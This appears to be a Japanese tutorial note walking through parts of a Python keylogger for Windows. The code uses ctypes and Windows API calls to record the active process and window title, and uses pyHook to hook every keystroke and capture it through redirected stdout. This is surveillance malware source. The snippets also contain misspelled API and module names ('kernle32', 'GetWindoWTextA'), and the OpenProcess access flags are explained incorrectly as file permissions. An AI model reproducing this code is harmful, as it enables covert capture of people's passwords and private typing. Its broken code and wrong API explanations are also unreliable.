# キーロガー(for Windows)

# KeyLoggerクラスのメソッドget_current_process

このメソッドは、そのキーログを得たタイミングでのプロセス名、プロセスID、その時点でアクティブだったウィンドウのタイトルを同時に表示してくれる。

それを実現するためにctypesモジュールでWindowsAPIを利用してるから少々難しい。

大まかな流れは

`GetForegroundWindow`でそのタイミングでのアクティビティウィンドウのウィンドウハンドルを取得

↓

`GetWindowThreadProcessId`でプロセスID取得

↓

`OpenProcess`でプロセスハンドル取得

↓

`GetModuleBaseNameA`でプロセス名を取得

↓

`GetWindowTextA`でウィンドウのタイトルバー（ウィンドウのタイトルを得るため）を取得

- ウィンドウハンドル…コンピュータがウィンドウを識別するための管理番号
- プロセスハンドル…プロセスを識別するための管理番号（プロセスをWindowsAPI経由で操作する時のもの）
- プロセスID…システム内でプロセスを識別するための各プロセス固有のID

参考：https://maku77.github.io/windows/winapi/process-handle.html

```python
hwnd = windll.user32.GetForegroundWindow()
pid = c_ulong(0)
windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
process_id = f'{pid.value}'                
```

`hwnd`がウィンドウハンドル。

`pid`はunsigned longのサイズ0で用意しておく。

`GetWindowThreadProcessId`には、「ウィンドウハンドル」と「プロセスIDを受け取る変数へのポインタ」の二つを指定。

`byref`はポインタのこと。このために`pid`はサイズ0で初期化しておいた。

これで変数`pid`にプロセスIDがコピーされた。

```python
executable = create_string_buffer(512)
h_process = windll.kernle32.OpenProcess(0x400 | 0x10, False, pid)
windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
```

`executable`は可変長の文字バッファ。

`OpenProcess`には、アクセス権とプロセスIDを指定してプロセスハンドルを取得。

`0x40`はディレクトリの場合、ディレクトリとそれに含まれるすべてのファイル (読み取り専用ファイルを含む) を削除する権限。

`0x10`は書き込み権限。（パイプ記号（`|`）は「または」の意味）

参考：[ファイル アクセス権限定数](https://docs.microsoft.com/ja-jp/windows/win32/fileio/file-access-rights-constants)

```python
windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
```

これでプロセス名を取得している。

もっと言うと、用意しておいたバッファ`executable`にプロセス名を格納してる。

```python
window_title = create_string_buffer(512)
windll.user32.GetWindoWTextA(hwnd, byref(window_title), 512)
```

`window_title`というバッファを用意。

`GetWindowTextA`の第一引数で指定したウィンドウハンドル、に対するウィンドウのタイトルバーを第二引数で指定したバッファに格納する。


# run関数について

```python
def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()
        
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
        
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log
```

最初の方にあるのが標準出力の取り扱い。

`sys.stdout`を一旦`save_stdout`に待避させ、`StringIO()`を`sys.stdout`に代入することで標準出力をファイルライク（file-like）に扱える。

だから最後の方で`sys.stdout`に対して`getvale()`関数（これはファイルの中身を全て取り出す関数）を適用して標準出力を得ることができている。

`save_stdout`に待避させておいたのを`sys.stdout`に代入して元通り。

```python
kl = KeyLogger()
hm = pyHook.HookManager()
hm.KeyDown = kl.mykeystroke
hm.HookKeyboard()
```

１行目で`HookManager`オブジェクトを作る。

`KeyDown`にコールバック関数として`KeyLogger`クラスの`mykeystroke`メソッドを指定。

`HookKeyboard()`で全ての打鍵を監視・フックする。

正直ここは`pyHook`のお決まり文句と考えていいと思う。

```python
while time.thread_time() < TIMEOUT:
   pythoncom.PumpWaitingMessages()
```

`time.thread_time`は、現在のスレッドにおけるシステムとCPU稼働の合計時間。

`pythoncom.PumpWaitingMessages()`で現在のスレッドのメッセージを全て吐き出す。

